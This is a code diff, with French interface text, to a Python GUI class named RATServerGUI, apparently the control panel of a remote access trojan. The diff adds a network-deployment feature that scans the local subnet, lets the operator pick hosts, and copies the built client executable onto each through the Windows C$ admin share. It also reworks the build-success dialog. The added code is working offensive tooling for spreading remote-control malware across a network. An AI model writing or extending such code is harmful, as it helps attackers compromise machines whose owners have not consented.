@@ -59,6 +59,14 @@ try:
 except ImportError:
     REPORT_AVAILABLE = False
 
+try:
+    from network_scanner import scan_network, get_local_network
+    SCANNER_AVAILABLE = True
+except ImportError:
+    SCANNER_AVAILABLE = False
+    def scan_network(network_range=None, callback=None): return []
+    def get_local_network(): return ("192.168.1.0/24", "192.168.1.1")
+
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -220,6 +228,7 @@ class RATServerGUI:
         self._alert_log = []          # list of (timestamp_str, msg, level)
         self._server_start_time = None
         self._total_connections = 0
+        self._last_built_exe = None
 
     def _build_sidebar(self, parent):
         sidebar = tk.Frame(parent, bg=self.bg_sidebar, width=165)
@@ -840,6 +849,8 @@ class RATServerGUI:
         ttk.Button(bf, text="Générer client", command=self.manual_generate_client).pack(side="left", padx=(0, 8))
         self._build_btn = ttk.Button(bf, text="Build exécutable", command=self.build_client_executable)
         self._build_btn.pack(side="left")
+        ttk.Button(bf, text="Déployer sur le réseau",
+                   command=self._open_deploy_panel).pack(side="left", padx=(8, 0))
 
         # Zone de progression build (cachée par défaut)
         self._build_progress_frame = tk.Frame(gen, bg=self.bg_card)
@@ -2243,6 +2254,195 @@ DÉMARRAGE RAPIDE:
         elif "successfully" in line_lower or "completed" in line_lower:
             self._build_pct_lbl.config(text="100%")
 
+    def _show_build_result(self, exe_path, dist_dir):
+        win = tk.Toplevel(self.root)
+        win.title("Build réussi")
+        win.configure(bg=self.bg_card)
+        win.geometry("420x160")
+        win.resizable(False, False)
+        win.transient(self.root)
+        tk.Label(win, text="Build réussi", fg=self.success_color, bg=self.bg_card,
+                 font=("Segoe UI", 12, "bold")).pack(pady=(14, 4))
+        tk.Label(win, text=os.path.basename(exe_path), fg=self.text_muted, bg=self.bg_card,
+                 font=("Consolas", 9)).pack()
+        btn_row = tk.Frame(win, bg=self.bg_card)
+        btn_row.pack(pady=16)
+        def open_folder():
+            if platform.system() == "Windows":
+                subprocess.Popen(f'explorer /select,"{exe_path}"')
+            elif platform.system() == "Darwin":
+                subprocess.Popen(["open", "-R", exe_path])
+            else:
+                subprocess.Popen(["xdg-open", dist_dir])
+            win.destroy()
+        ttk.Button(btn_row, text="Ouvrir le dossier", command=open_folder).pack(side="left", padx=6)
+        ttk.Button(btn_row, text="Déployer sur le réseau",
+                   command=lambda: (win.destroy(), self._show_section("settings"),
+                                    self._open_deploy_panel(exe_path))
+                   ).pack(side="left", padx=6)
+        ttk.Button(btn_row, text="Fermer", command=win.destroy).pack(side="left", padx=6)
+
+    def _open_deploy_panel(self, exe_path=None):
+        if exe_path is None:
+            exe_path = self._last_built_exe
+        if not exe_path or not os.path.isfile(exe_path):
+            self.log_message("Aucun exe disponible — build d'abord un client", "warning"); return
+
+        # Find or create the deploy panel inside Settings page
+        settings_frame = self._content_frames.get("settings")
+        if not settings_frame:
+            return
+        # Remove previous deploy panel if any
+        if hasattr(self, "_deploy_panel") and self._deploy_panel.winfo_exists():
+            self._deploy_panel.destroy()
+
+        panel = tk.Frame(settings_frame, bg=self.bg_card,
+                         highlightbackground=self.accent_color, highlightthickness=1)
+        panel.pack(fill="both", expand=True, padx=10, pady=(8, 10))
+        self._deploy_panel = panel
+
+        # Header
+        hdr = tk.Frame(panel, bg=self.bg_sidebar)
+        hdr.pack(fill="x")
+        tk.Label(hdr, text="Déployer sur le réseau local", fg=self.accent_color,
+                 bg=self.bg_sidebar, font=("Segoe UI", 10, "bold"), padx=12, pady=6).pack(side="left")
+        tk.Button(hdr, text="✕", fg=self.text_muted, bg=self.bg_sidebar,
+                  activebackground=self.error_color, activeforeground="white",
+                  relief="flat", font=("Segoe UI", 9), bd=0, padx=10,
+                  command=panel.destroy).pack(side="right")
+
+        body = tk.Frame(panel, bg=self.bg_card)
+        body.pack(fill="both", expand=True, padx=10, pady=8)
+
+        # Exe info
+        info_row = tk.Frame(body, bg=self.bg_card)
+        info_row.pack(fill="x", pady=(0, 8))
+        tk.Label(info_row, text="Fichier :", fg=self.text_muted, bg=self.bg_card,
+                 font=("Segoe UI", 9)).pack(side="left")
+        tk.Label(info_row, text=os.path.basename(exe_path), fg=self.accent_color,
+                 bg=self.bg_card, font=("Consolas", 9)).pack(side="left", padx=6)
+
+        # Scan controls
+        scan_row = tk.Frame(body, bg=self.bg_card)
+        scan_row.pack(fill="x", pady=(0, 6))
+        network_range, local_ip = get_local_network()
+        net_var = tk.StringVar(value=network_range)
+        tk.Label(scan_row, text="Plage réseau :", fg=self.text_muted, bg=self.bg_card,
+                 font=("Segoe UI", 9)).pack(side="left")
+        ttk.Entry(scan_row, textvariable=net_var, width=18,
+                  font=("Consolas", 9)).pack(side="left", padx=6)
+        scan_status = tk.Label(scan_row, text="", fg=self.text_muted, bg=self.bg_card,
+                                font=("Segoe UI", 8))
+        scan_status.pack(side="left", padx=6)
+        scan_btn = ttk.Button(scan_row, text="Scanner le réseau")
+        scan_btn.pack(side="right")
+
+        # Host list
+        list_frame = tk.Frame(body, bg=self.bg_input,
+                              highlightbackground=self.border_color, highlightthickness=1)
+        list_frame.pack(fill="both", expand=True, pady=(0, 8))
+        host_listbox = tk.Listbox(list_frame, bg=self.bg_input, fg=self.text_color,
+                                   font=("Consolas", 9), borderwidth=0, highlightthickness=0,
+                                   selectbackground=self.accent_color, selectforeground=self.bg_main,
+                                   selectmode=tk.MULTIPLE)
+        hsb = tk.Scrollbar(list_frame, orient="vertical", command=host_listbox.yview,
+                            bg=self.bg_sidebar, troughcolor=self.bg_main)
+        hsb.pack(side="right", fill="y")
+        host_listbox.config(yscrollcommand=hsb.set)
+        host_listbox.pack(fill="both", expand=True, padx=4, pady=4)
+        tk.Label(body, text="Sélectionne une ou plusieurs machines (Ctrl+clic), puis clique Déployer",
+                 fg=self.text_muted, bg=self.bg_card, font=("Segoe UI", 8)).pack(anchor="w")
+
+        # Deploy controls
+        deploy_row = tk.Frame(body, bg=self.bg_card)
+        deploy_row.pack(fill="x", pady=(6, 0))
+        deploy_btn = ttk.Button(deploy_row, text="Déployer sur la sélection")
+        deploy_btn.pack(side="left")
+        deploy_log = tk.Label(deploy_row, text="", fg=self.text_muted, bg=self.bg_card,
+                               font=("Segoe UI", 8))
+        deploy_log.pack(side="left", padx=10)
+
+        # Stored hosts list
+        found_hosts = []
+
+        def do_scan():
+            scan_btn.config(state="disabled", text="Scan en cours…")
+            scan_status.config(text="")
+            host_listbox.delete(0, tk.END)
+            found_hosts.clear()
+            def run():
+                def cb(msg):
+                    self.root.after(0, lambda m=msg: scan_status.config(text=m[-50:]))
+                hosts = scan_network(net_var.get(), callback=cb)
+                self.root.after(0, lambda: _fill_hosts(hosts))
+            threading.Thread(target=run, daemon=True).start()
+
+        def _fill_hosts(hosts):
+            host_listbox.delete(0, tk.END)
+            found_hosts.clear()
+            if not hosts:
+                host_listbox.insert(tk.END, "  Aucun hôte trouvé")
+                scan_status.config(text="Scan terminé — 0 hôte")
+            else:
+                for ip, hostname in hosts:
+                    found_hosts.append((ip, hostname))
+                    label = f"  {ip:<16}  {hostname}"
+                    host_listbox.insert(tk.END, label)
+                scan_status.config(text=f"Scan terminé — {len(hosts)} hôte(s)")
+            scan_btn.config(state="normal", text="Scanner le réseau")
+
+        def do_deploy():
+            sel = host_listbox.curselection()
+            if not sel:
+                deploy_log.config(text="Sélectionne au moins une machine", fg=self.warning_color)
+                return
+            targets = [found_hosts[i] for i in sel if i < len(found_hosts)]
+            if not targets:
+                return
+            deploy_btn.config(state="disabled")
+            deploy_log.config(text=f"Déploiement sur {len(targets)} machine(s)…", fg=self.text_muted)
+            def run():
+                results = []
+                for ip, hostname in targets:
+                    ok, msg = _deploy_to(ip, exe_path)
+                    results.append((ip, ok, msg))
+                self.root.after(0, lambda: _show_deploy_results(results))
+            threading.Thread(target=run, daemon=True).start()
+
+        def _deploy_to(ip, src_path):
+            filename = os.path.basename(src_path)
+            # Try SMB admin share (Windows → Windows)
+            smb_dst = f"\\\\{ip}\\C$\\Users\\Public\\{filename}"
+            try:
+                import shutil
+                shutil.copy2(src_path, smb_dst)
+                return True, f"Copié via SMB → {smb_dst}"
+            except Exception as smb_err:
+                pass
+            # Try HTTP server + trigger (if client already connected)
+            with self.lock:
+                connected_ips = [c["address"][0] for c in self.clients.values()]
+            if ip in connected_ips:
+                return False, "Machine déjà connectée — pas besoin de redéployer"
+            return False, f"SMB échoué — partage admin inaccessible (\\\\{ip}\\C$)"
+
+        def _show_deploy_results(results):
+            deploy_btn.config(state="normal")
+            ok_count = sum(1 for _, ok, _ in results if ok)
+            deploy_log.config(
+                text=f"{ok_count}/{len(results)} réussi(s)",
+                fg=self.success_color if ok_count == len(results) else self.warning_color
+            )
+            for ip, ok, msg in results:
+                level = "success" if ok else "warning"
+                self.log_message(f"Deploy {ip}: {msg}", level)
+
+        scan_btn.config(command=do_scan)
+        deploy_btn.config(command=do_deploy)
+
+        # Auto-scroll Settings to show the panel
+        self._show_section("settings")
+
     def build_client_executable(self):
         if not os.path.exists("client_gen.py"):
             self.log_message("Generate client_gen.py first", "error")
@@ -2305,23 +2505,9 @@ DÉMARRAGE RAPIDE:
                     p, d = exe_path, dist_path
 
                     self.root.after(0, lambda: self._build_progress_hide(success=True))
+                    self._last_built_exe = p
                     self.root.after(0, lambda: self.log_message(f"[BUILD OK] {p}", "success"))
-
-                    def _show_result():
-                        answer = messagebox.askquestion(
-                            "Build réussi",
-                            f"Executable créé:\n{p}\n\nOuvrir le dossier?",
-                            icon="info"
-                        )
-                        if answer == "yes":
-                            if platform.system() == "Windows":
-                                subprocess.Popen(f'explorer /select,"{p}"')
-                            elif platform.system() == "Darwin":
-                                subprocess.Popen(["open", "-R", p])
-                            else:
-                                subprocess.Popen(["xdg-open", d])
-
-                    self.root.after(0, _show_result)
+                    self.root.after(0, lambda: self._show_build_result(p, d))
                     return True
                 else:
                     self.root.after(0, lambda: self._build_progress_hide(success=False))
